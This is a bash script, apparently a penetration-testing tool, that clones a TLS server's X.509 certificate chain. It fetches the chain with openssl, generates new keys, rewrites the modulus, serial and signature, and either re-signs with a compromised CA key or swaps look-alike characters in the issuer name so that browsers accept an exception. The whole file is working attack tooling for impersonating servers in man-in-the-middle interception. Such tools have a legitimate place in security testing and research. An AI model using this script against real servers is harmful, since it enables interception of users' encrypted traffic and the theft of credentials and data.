#!/bin/bash
# Adrian Vollmer, SySS GmbH 2017
# Reference:
# https://security.stackexchange.com/questions/127095/manually-walking-through-the-signature-validation-of-a-certificate

set -e

DIR="/tmp"
SCRIPT_DIR="$( cd "$( dirname "${BASH_SOURCE[0]}" )" && pwd )"

if [ "$1" = "" ] ; then
cat <<EOF
Usage: $0 [<sni>@]<host>:<port>|<pem-file> [<subject> <key>]

Clone an X509 certificate. The cloned certificate and the corresponding key
will be located in $DIR. Their filenames make up the output of this script.

The mandatory argument can either be a filename of an x509 certifcate in PEM
format, or a host name and a port number separated by a colon. Optionally, you
can precede this by a servername and an '@' if you want to specify the name
of the virtual host via SNI.

As optional parameters, you can specifiy the distinguished name of the
subject of a certificate and the corresponding private key in PEM format.
This script will clone all certificates in the chain below the compromised
one. The subject must match the form as in 'openssl x509 -noout -subject',
but without the 'subject=' string.

If none of the certificates in the chain have a subject name that matches
the one of the certificate that you control, the subject of the cloned host
certificate will be changed accordingly and it is assumed that your
certificate is a trust anchor.
EOF
    exit 1
fi

# set some variables
HOST="$1"
COMPROMISED_CA="$2"
COMPROMISED_KEY="$3"

if [[ ! -z $COMPROMISED_KEY ]] ; then
    if [[ ! -f $COMPROMISED_KEY ]] ; then
        echo "File not found: $COMPROMISED_KEY" >&2
        exit 1
    fi
fi

set -u

if [[ -f "$HOST" ]] ; then
    CERTNAME="$(basename "$HOST")"
else
    CERTNAME="$HOST"
    SNI="${HOST%%@*}"
    if [ ! $SNI = $HOST ] ; then
        HOST="${HOST##*@}"
    fi
fi
rm -f "$DIR/${CERTNAME}_"*

function generate_key () {
    # create new private/public key pair (re-use private key if applicable)
    local KEY_LEN="$1"
    local MY_PRIV_KEY="$2"

    # TODO support DSA, EC
    openssl genrsa -out "$MY_PRIV_KEY" "$KEY_LEN" 2> /dev/null

    NEW_MODULUS="$(openssl rsa -in "$MY_PRIV_KEY" -pubout 2> /dev/null \
        | openssl rsa -pubin -noout -modulus \
        | sed 's/Modulus=//' | tr "[:upper:]" "[:lower:]" )"
    printf "%s" "$NEW_MODULUS"
}

function parse_certs () {
    # read the output of s_client via stdin and clone each cert
    # from https://stackoverflow.com/questions/45243785/script-wrapper-for-openssl-which-will-download-an-entire-certificate-chain-and
    nl=$'\n'

    state=begin
    counter=0
    while IFS= read -r line ; do
        case "$state;$line" in
          "begin;-----BEGIN CERTIFICATE-----" )
            # A certificate is about to begin!
            state=reading
            current_cert="$line"
            ;;

          "reading;-----END CERTIFICATE-----" )
            # Last line of a cert; save it and get ready for the next
            current_cert+="${current_cert:+$nl}$line"

            # ...and save it
            printf "%s" "$current_cert" > "$DIR/${CERTNAME}_$counter"
            counter=$((counter+=1))

            # no need to clone the other certs if we have no compromised CA
            if [[ -z $COMPROMISED_CA ]] ; then
                break
            fi

            state=begin
            current_cert=""
            ;;

          "reading;"* )
            # Otherwise, it's a normal part of a cert; accumulate it to be
            # written out when we see the end
            current_cert+="$nl$line"
            ;;
        esac
    done
}

function oid() {
    # https://bugzil.la/1064636
    case "$1" in
        # "300d06092a864886f70d0101020500")
        # ;;md2WithRSAEncryption
        "300b06092a864886f70d01010b") echo sha256
        ;;#sha256WithRSAEncryption
        "300b06092a864886f70d010105") echo sha1
        ;;#sha1WithRSAEncryption
        "300d06092a864886f70d01010c0500") echo sha384
        ;;#sha384WithRSAEncryption
        "300a06082a8648ce3d040303") echo "ECDSA not supported" >&2; exit 1
        ;;#ecdsa-with-SHA384
        "300a06082a8648ce3d040302") echo "ECDSA not supported" >&2; exit 1
        ;;#ecdsa-with-SHA256
        "300d06092a864886f70d0101040500") echo md5
        ;;#md5WithRSAEncryption
        "300d06092a864886f70d01010d0500") echo sha512
        ;;#sha512WithRSAEncryption
        "300d06092a864886f70d01010b0500") echo sha256
        ;;#sha256WithRSAEncryption
        "300d06092a864886f70d0101050500") echo sha1
        ;;#sha1WithRSAEncryption
        *) echo "Unknow Hash Algorithm OID: $1" >&2
            exit 1
        ;;
    esac
}


function hexlify(){
    xxd -p | tr -d '\n'
}

function unhexlify(){
    xxd -p -r
}


function clone_cert () {
    local CERT_FILE="$1"
    local ISSUING_KEY="$2"
    SUBJECT="$(openssl x509 -in "$CERT_FILE" -noout -subject \
        | sed 's/.* CN = //g')"
    ISSUER="$(openssl x509 -in "$CERT_FILE" -noout -issuer \
        | sed 's/.* CN = //g')"
    SERIAL="$(openssl x509 -in "$CERT_FILE" -noout -serial \
        | sed 's/serial=//g' | tr '[A-F]' '[a-f]')"

    # if it is not self-signed and we have no compromised CA, change the
    # issuer or no browser will allow an exception.
    # it needs to stay the same length though.
    # also, the serial needs to be changed, because browsers keep track of
    # that.
    if [[ ! -f $ISSUING_KEY ]] && [[ $ISSUER != $SUBJECT ]]; then
        if [[ $ISSUER =~ I ]] ; then
            NEW_ISSUER=$(printf "%s" "$ISSUER" | sed "s/I/l/")
        elif [[ $ISSUER =~ l ]] ; then
            NEW_ISSUER=$(printf "%s" "$ISSUER" | sed "s/l/I/")
        elif [[ $ISSUER =~ O ]] ; then
            NEW_ISSUER=$(printf "%s" "$ISSUER" | sed "s/O/0/")
        elif [[ $ISSUER =~ 0 ]] ; then
            NEW_ISSUER=$(printf "%s" "$ISSUER" | sed "s/0/O/")
        else
            NEW_ISSUER=$(printf "%s" "$ISSUER" | sed "s/.$/ /")
        fi
        SER_LEN=$(printf "%s" "$SERIAL" | wc -c)
        SER_LEN=$((SER_LEN/2))
        NEW_SERIAL=$(openssl rand -hex $SER_LEN)
    else
        NEW_ISSUER=$ISSUER
        NEW_SERIAL=$SERIAL
    fi
    ISSUER=$(printf "%s" "$ISSUER" | hexlify)
    NEW_ISSUER=$(printf "%s" "$NEW_ISSUER" | hexlify)
    CLONED_CERT_FILE="${CERT_FILE}.cert"
    CLONED_KEY_FILE="${CERT_FILE}.key"


    OLD_MODULUS="$(openssl x509 -in "$CERT_FILE" -modulus -noout \
        | sed -e 's/Modulus=//' | tr "[:upper:]" "[:lower:]")"
    KEY_LEN="$(openssl x509  -in "$CERT_FILE" -noout -text \
        | grep Public-Key: | grep -o "[0-9]\+")"

    NEW_MODULUS="$(generate_key "$KEY_LEN" "$CLONED_KEY_FILE")"

    # extract old signature
    offset="$(openssl asn1parse -in "$CERT_FILE" | grep SEQUENCE \
        | tail -n1 |sed 's/ \+\([0-9]\+\):.*/\1/' | head -n1)"
    SIGNING_ALGO="$(openssl asn1parse -in "$CERT_FILE" \
        -strparse $offset -noout -out >(hexlify))"
    offset="$(openssl asn1parse -in "$CERT_FILE" \
        | tail -n1 |sed 's/ \+\([0-9]\+\):.*/\1/' | head -n1)"
    OLD_SIGNATURE="$(openssl asn1parse -in "$CERT_FILE" \
        -strparse $offset -noout -out >(hexlify))"
    OLD_TBS_CERTIFICATE="$(openssl asn1parse -in "$CERT_FILE" \
        -strparse 4 -noout -out >(hexlify))"

    OLD_TBS_CERTIFICATE="$(printf "%s" "$OLD_TBS_CERTIFICATE" \
        | sed "s/$ISSUER/$NEW_ISSUER/" \
        | sed "s/$SERIAL/$NEW_SERIAL/" )"
    # create new signature
    NEW_TBS_CERTIFICATE="$(printf "%s" "$OLD_TBS_CERTIFICATE" \
        | sed "s/$OLD_MODULUS/$NEW_MODULUS/")"

    digest="$(oid "$SIGNING_ALGO")"
    if [[ -f $ISSUING_KEY ]] ; then
        SIGNING_KEY="$ISSUING_KEY"
    else
        SIGNING_KEY="$CLONED_KEY_FILE"
    fi
    NEW_SIGNATURE="$(printf "%s" "$NEW_TBS_CERTIFICATE" | unhexlify \
        | openssl dgst -$digest -sign "$SIGNING_KEY" | hexlify)"

    # replace signature
    openssl x509 -in "$CERT_FILE" -outform DER | hexlify \
        | sed "s/$OLD_MODULUS/$NEW_MODULUS/" \
        | sed "s/$ISSUER/$NEW_ISSUER/" \
        | sed "s/$SERIAL/$NEW_SERIAL/" \
        | sed "s/$OLD_SIGNATURE/$NEW_SIGNATURE/" | unhexlify \
        | openssl x509 -inform DER -outform PEM > "$CLONED_CERT_FILE"
    printf "%s\n" "$CLONED_KEY_FILE"
    printf "%s\n" "$CLONED_CERT_FILE"
}


# save all certificates in chain
if [[ -f "$HOST" ]] ; then
    cat "$HOST" | parse_certs
else
    openssl s_client -servername "$SNI" \
        -showcerts -connect "$HOST" < /dev/null 2>/dev/null | \
         parse_certs
fi

# clone them
for certfile in `ls -r "$DIR/${CERTNAME}_"*` ; do
    CERT="$(cat $certfile)"
    number="${certfile##*_}"
    signing_key="${certfile%_*}_((number+1)).key"
    if [[ -f $COMPROMISED_KEY ]] ; then
        ISSUER="$(openssl x509 -in "$certfile" -noout -issuer | sed 's/^issuer=//')"
        if [[ $ISSUER == $COMPROMISED_CA ]] ; then
            clone_cert "$certfile" "$COMPROMISED_KEY"
        else
            if [[ -f "$signing_key" ]] ; then
                clone_cert "$certfile" "$signing_key"
            fi
        fi
    else
        if [[ $number == "0" ]] ; then
            clone_cert "$certfile" ""
        fi
    fi
done
